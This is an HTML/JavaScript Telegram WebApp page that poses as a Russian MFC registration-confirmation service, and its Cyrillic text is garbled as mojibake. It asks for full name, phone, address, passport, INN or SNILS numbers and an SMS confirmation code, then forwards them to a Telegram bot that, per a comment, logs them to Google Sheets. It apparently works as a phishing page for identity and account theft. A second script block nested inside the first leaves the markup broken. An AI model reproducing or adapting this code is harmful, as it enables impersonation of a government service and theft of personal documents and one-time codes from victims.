<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>–ú–§–¶ ‚Äî –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root{
      --primary-color:#800000;--secondary-color:#660000;--info-color:#990000;
      --error-color:#B22222;--background-color:#F5E6E6;--white:#fff;--text-color:#333;
      --shadow:0 4px 12px rgba(128,0,0,.3);--input-bg:#EADADA;--input-border:#990000;
      --table-header-bg:linear-gradient(90deg,#800000,#660000);
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Segoe UI',Arial,sans-serif;background:var(--background-color);padding:20px;display:flex;justify-content:center;min-height:100vh}
    .container{max-width:500px;width:100%;background:var(--white);padding:30px;border-radius:16px;box-shadow:var(--shadow);text-align:center}
    .step{display:none;text-align:left}
    .step.active{display:block}
    h2,h3{margin-bottom:20px;font-weight:700;font-size:1.6em;color:var(--primary-color);display:flex;align-items:center;gap:10px;line-height:1.3}
    .input-group{margin-bottom:20px;text-align:left;display:flex;flex-direction:column;align-items:stretch}
    input{width:100%;padding:12px 15px;margin-top:8px;border:2px solid var(--input-border);border-radius:10px;font-size:16px;background:var(--input-bg);box-shadow:0 2px 6px rgba(0,0,0,.1);transition:border-color .3s,box-shadow .3s}
    input:focus{outline:none;border-color:var(--primary-color);box-shadow:0 4px 12px rgba(128,0,0,.2)}
    .error{color:var(--error-color);font-size:14px;margin-top:6px;font-weight:600;text-align:left}
    .buttons{margin-top:20px;display:flex;flex-direction:column;gap:12px}
    button{width:100%;padding:14px;border:none;border-radius:10px;cursor:pointer;font-size:16px;font-weight:600;transition:background-color .3s,transform .1s;text-align:center;color:var(--white)}
    button:hover{transform:translateY(-2px)}
    button:disabled{background:#ccc;cursor:not-allowed}
    .next{background:var(--primary-color)}
    .back{background:var(--secondary-color)}
    .menu-btn,.faq-btn{background:var(--info-color)}
    .data-table{margin-top:20px;width:100%;border-collapse:collapse;display:none;background:var(--white);border-radius:10px;overflow:hidden}
    .data-table.active{display:table}
    .data-table th,.data-table td{border:1px solid var(--input-border);padding:15px;text-align:left;font-size:14px;vertical-align:middle}
    .data-table th{background:var(--table-header-bg);color:var(--white);font-weight:700;text-transform:uppercase}
    .data-table tr{transition:background-color .3s}
    .data-table tr:hover{background-color:#F9F5F5}
    .data-table tr:nth-child(even){background-color:#F5EDED}
  </style>
</head>
<body>
  <div class="container">
    <div id="wizard">
      <!-- –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é -->
      <div class="step active" id="step-main">
        <img src="https://centergoroda.com/upload/iblock/3fa/ba9xciv1erty46hhuhgdsrr92mr7yz3l/image_2021_09_07T12_44_55_842Z.png" alt="Welcome" style="width:100%;border-radius:10px;margin-bottom:20px;"/>
        <h2 id="welcome-message">üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, üëã</h2>
        <p>–ì–æ—Ç–æ–≤—ã –Ω–∞—á–∞—Ç—å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ –º–µ—Å—Ç—É –∂–∏—Ç–µ–ª—å—Å—Ç–≤–∞?</p>
        <div class="buttons">
          <button class="menu-btn" data-action="schedule">üìã –ó–∞–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—ë–º</button>
          <button class="menu-btn" data-action="documents">üìú –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤</button>
          <button class="menu-btn" data-action="check-status">üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏</button>
          <button class="menu-btn" data-action="contact">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          <button class="menu-btn" data-action="faq">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
          <button class="menu-btn" data-action="show-data">üìä –ú–æ–∏ –¥–∞–Ω–Ω—ã–µ</button>
        </div>
      </div>

      <!-- –§–ò–û -->
      <div class="step" id="step-fullname">
        <h3>üë§ –£–∫–∞–∂–∏—Ç–µ –§–ò–û</h3>
        <div class="input-group">
          <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" />
          <div class="error" id="err-fullname"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –¢–µ–ª–µ—Ñ–æ–Ω -->
      <div class="step" id="step-phone">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <div class="input-group">
          <input type="tel" id="phone" placeholder="+79991234567" />
          <div class="error" id="err-phone"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ê–¥—Ä–µ—Å -->
      <div class="step" id="step-address">
        <h3>üè† –£–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å</h3>
        <div class="input-group">
          <input type="text" id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1, –∫–≤. 2" />
          <div class="error" id="err-address"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –¢–∏–ø –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step" id="step-document-type">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button class="menu-btn" data-doc="–ü–∞—Å–ø–æ—Ä—Ç">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button class="menu-btn" data-doc="–ò–ù–ù">üßæ –ò–ù–ù</button>
          <button class="menu-btn" data-doc="–°–ù–ò–õ–°">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step" id="step-document-number">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div class="input-group">
          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
          <input type="text" id="docnumber" placeholder="4510 123456" />
          <div class="error" id="err-doc"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ö–æ–¥ -->
      <div class="step" id="step-code">
        <h3>üîê –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS</h3>
        <div class="input-group">
          <input type="text" id="code" placeholder="1234" />
          <div class="error" id="err-code"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>
      </div>

      <!-- FAQ, –∫–æ–Ω—Ç–∞–∫—Ç—ã –∏ —Ç.–¥. –æ–ø—É—â–µ–Ω—ã —Ä–∞–¥–∏ –∫—Ä–∞—Ç–∫–æ—Å—Ç–∏ -->

      <!-- –í—ã–≤–æ–¥ –ª–æ–∫–∞–ª—å–Ω–æ–π —Ç–∞–±–ª–∏—Ü—ã -->
      <div id="data-output" class="data-table">
        <h3>üìã –°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</h3>
        <table>
          <thead>
            <tr><th>–í—Ä–µ–º—è</th><th>–§–ò–û</th><th>–¢–µ–ª–µ—Ñ–æ–Ω</th><th>–ê–¥—Ä–µ—Å</th><th>–î–æ–∫—É–º–µ–Ω—Ç</th><th>–ö–æ–¥</th></tr>
          </thead>
          <tbody id="data-table-body"></tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    // === –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram-–±–æ—Ç–∞ (–¥–æ–±–∞–≤–ª–µ–Ω–æ) ===
    function sendViaTelegramBot(payload){
      const tg = window.Telegram && window.Telegram.WebApp;
      if(!tg){ console.warn('–û—Ç–∫—Ä–æ–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É –±–æ—Ç–∞ (WebApp).'); return; }
      tg.ready();
      tg.sendData(JSON.stringify({type:'lead', payload}));
      tg.HapticFeedback?.impactOccurred?.('light');
    }

    class MFCWizard{
      constructor(){
        this.steps=document.querySelectorAll('.step');
        this.currentStep='main';
        this.formData={};
        this.dataStore=[];
        this.initEventListeners();
        this.updateWelcomeMessage();
        this.showStep('main');
      }

      initEventListeners(){
        const root=document.getElementById('wizard');
        if(!root) return;
        root.addEventListener('click',(e)=>{
          const t=e.target;
          if(t.classList.contains('next')) this.handleNext();
          else if(t.classList.contains('back')) this.handleBack();
          else if(t.classList.contains('menu-btn')) this.handleMenuAction(t.dataset.action, t.dataset.doc);
        });
        ['fullname','phone','address','docnumber','code'].forEach(id=>{
          document.getElementById(id)?.addEventListener('input',()=>this.validateStep(this.currentStep));
        });

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—É—é –∫–Ω–æ–ø–∫—É –æ—Ç–ø—Ä–∞–≤–∫–∏ Telegram —Å–Ω–∏–∑—É
        const tg = window.Telegram && window.Telegram.WebApp;
        if(tg){
          tg.MainButton.setText('–û—Ç–ø—Ä–∞–≤–∏—Ç—å').hide();
          tg.onEvent('mainButtonClicked', () => this.send());
        }
      }

      updateWelcomeMessage(){
        const el=document.getElementById('welcome-message');
        const tg=window.Telegram && window.Telegram.WebApp;
        let name='–ì–æ—Å—Ç—å';
        try{ if(tg?.initDataUnsafe?.user){ const u=tg.initDataUnsafe.user; name=[u.first_name,u.last_name].filter(Boolean).join(' ')||u.username||'–ì–æ—Å—Ç—å'; } }catch(_){ }
        if(el) el.textContent=`üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${name}! üëã`;
      }

      showStep(stepId){
        this.steps.forEach(s=>s.classList.toggle('active', s.id===`step-${stepId}`));
        this.currentStep=stepId;
        window.scrollTo({top:0,behavior:'smooth'});
      }

      handleNext(){
        if(!this.validateStep(this.currentStep)) return;
        if(this.currentStep==='fullname'){ this.formData.fullname=(document.getElementById('fullname')?.value||'').trim(); return this.showStep('phone'); }
        if(this.currentStep==='phone'){ this.formData.phone=(document.getElementById('phone')?.value||'').trim(); return this.showStep('address'); }
        if(this.currentStep==='address'){ this.formData.address=(document.getElementById('address')?.value||'').trim(); return this.showStep('document-type'); }
        if(this.currentStep==='document-number'){ this.formData['document-number']=(document.getElementById('docnumber')?.value||'').trim(); return this.showStep('code'); }
        if(this.currentStep==='code'){ this.formData.code=(document.getElementById('code')?.value||'').trim(); return this.send(); }
      }

      handleBack(){
        const map={fullname:'main',phone:'fullname',address:'phone','document-type':'address','document-number':'document-type',code:'document-number'};
        this.showStep(map[this.currentStep]||'main');
      }

      handleMenuAction(action, doc){
        if(action==='schedule') return this.showStep('fullname');
        if(action==='documents') return alert('–°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤: –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–°, –≤—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù.');
        if(action==='check-status') return alert('–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –≤ –¥–µ–º–æ.');
        if(action==='contact') return location.href='https://t.me/MFC_SUPPOR';
        if(action==='faq') return alert('FAQ –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ.');
        if(action==='show-data'){ document.getElementById('data-output').classList.add('active'); return; }
        if(doc){
          this.formData['document-type']=doc;
          const ex={'–ü–∞—Å–ø–æ—Ä—Ç':'–ü—Ä–∏–º–µ—Ä: 4510 123456','–ò–ù–ù':'–ü—Ä–∏–º–µ—Ä: 500100732259','–°–ù–ò–õ–°':'–ü—Ä–∏–º–µ—Ä: 112-233-445 95'};
          document.getElementById('doc-example').textContent=ex[doc]||'';
          return this.showStep('document-number');
        }
      }

      validateStep(step){
        const e=(id)=>document.getElementById(id);
        if(step==='fullname'){ const v=(e('fullname').value||'').trim(); if(!v){ e('err-fullname').textContent='–£–∫–∞–∂–∏—Ç–µ –§–ò–û'; return false } e('err-fullname').textContent=''; return true; }
        if(step==='phone'){ const v=(e('phone').value||'').trim(); if(!v){ e('err-phone').textContent='–£–∫–∞–∂–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω'; return false } e('err-phone').textContent=''; return true; }
        if(step==='address'){ const v=(e('address').value||'').trim(); if(!v){ e('err-address').textContent='–£–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å'; return false } e('err-address').textContent=''; return true; }
        if(step==='document-number'){ const v=(e('docnumber').value||'').trim(); if(!v){ e('err-doc').textContent='–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞'; return false } e('err-doc').textContent=''; return true; }
        if(step==='code'){ const v=(e('code').value||'').trim(); if(!/^\d{4}$/.test(v)){ e('err-code').textContent='–ö–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å 4 —Ü–∏—Ñ—Ä—ã'; return false } e('err-code').textContent=''; return true; }
        return true;
      }

      send(){
        const rec={
          timestamp:new Date().toISOString().slice(0,19).replace('T',' '),
          fullname:this.formData.fullname||'',
          phone:this.formData.phone||'',
          address:this.formData.address||'',
          document:`${this.formData['document-type']||''} ${this.formData['document-number']||''}`.trim(),
          code:this.formData.code||''
        };
        // 1) –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –±–æ—Ç–∞ (–æ–Ω –∑–∞–ø–∏—à–µ—Ç –≤ Google Sheets)
        sendViaTelegramBot(rec);
        // 2) –ª–æ–∫–∞–ª—å–Ω–æ –æ—Ç—Ä–∏—Å—É–µ–º —Ç–∞–±–ª–∏—Ü—É –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
        this.dataStore.push(rec); this.renderDataTable();
        document.getElementById('data-output').classList.add('active');
        this.showStep('main');
      }

      renderDataTable(){
        const tbody=document.getElementById('data-table-body');
        tbody.innerHTML='';
        this.dataStore.forEach(r=>{
          const tr=document.createElement('tr');
          tr.innerHTML=`<td>${r.timestamp}</td><td>${r.fullname}</td><td>${r.phone}</td><td>${r.address}</td><td>${r.document}</td><td>${r.code}</td>`;
          tbody.appendChild(tr);
        });
      }
    }

    new MFCWizard();
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
(function () {
  const tg = window.Telegram && Telegram.WebApp;
  if (!tg) { alert("–û—Ç–∫—Ä–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É –±–æ—Ç–∞ /start ‚Äî –∏–Ω–∞—á–µ –æ—Ç–ø—Ä–∞–≤–∫–∞ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç."); return; }
  tg.ready();

  function val(sel){ return document.querySelector(sel)?.value?.trim() || ""; }

  function collect() {
    let rec = {
      timestamp: new Date().toISOString().slice(0,19).replace("T"," "),
      fullname:  val("#fio") || val("#fullname"),
      phone:     val("#phone") || val("input[type='tel']"),
      address:   val("#address"),
      document:  (val("#documentType") || val("#docType") || val("#doc")) + " " +
                 (val("#documentNumber") || val("#docNumber") || val("#docnum")),
      code:      val("#code")
    };

    // –ï—Å–ª–∏ –ø–æ–ª–µ–π –Ω–µ—Ç ‚Äî –≤–∑—è—Ç—å –ø–æ—Å–ª–µ–¥–Ω—é—é —Å—Ç—Ä–æ–∫—É –∏–∑ –≤–∞—à–µ–π —Ç–∞–±–ª–∏—Ü—ã ¬´–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ¬ª
    const last = document.querySelector("#data-table-body tr:last-child");
    if ((!rec.fullname || !rec.phone) && last) {
      const t = last.querySelectorAll("td");
      if (t.length >= 6) {
        rec = {
          timestamp: t[0].textContent.trim(),
          fullname:  t[1].textContent.trim(),
          phone:     t[2].textContent.trim(),
          address:   t[3].textContent.trim(),
          document:  t[4].textContent.trim(),
          code:      t[5].textContent.trim(),
        };
      }
    }
    // –ü–æ—Å–ª–µ–¥–Ω–∏–π fallback ‚Äî —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –ø—É—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü–∞‚Üí–±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç
    if (!rec.fullname && !rec.phone) {
      rec = { timestamp: new Date().toISOString().slice(0,19).replace("T"," "),
              fullname: "–¢–µ—Å—Ç –∏–∑ WebApp", phone: "+70000000000",
              address: "‚Äî", document: "PING", code: "0000" };
    }
    return rec;
  }

  function send() {
    const rec = collect();
    console.log("[WebApp send]", rec);
    tg.sendData(JSON.stringify({ type: "lead", payload: rec }));
    tg.HapticFeedback?.impactOccurred?.("light");
  }

  // –ü–æ–≤–µ—Å–∏–º –Ω–∞ —Å–∏—Å—Ç–µ–º–Ω—É—é –∫–Ω–æ–ø–∫—É Telegram
  tg.MainButton.setText("–û—Ç–ø—Ä–∞–≤–∏—Ç—å").show();
  tg.onEvent("mainButtonClicked", send);

  // –ò –Ω–∞ –ª—é–±—ã–µ –∫–Ω–æ–ø–∫–∏ —Å —Ç–µ–∫—Å—Ç–æ–º –û—Ç–ø—Ä–∞–≤–∏—Ç—å/–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å
  document.addEventListener("click", (e) => {
    const t = e.target;
    if (!t) return;
    const txt = (t.textContent || "").toLowerCase();
    if (t.id === "send" || /–æ—Ç–ø—Ä–∞–≤|–ø–æ–¥—Ç–≤–µ—Ä|–≥–æ—Ç–æ–≤–æ/.test(txt)) send();
  });
})();
</script>


  </script>
</body>
</html>
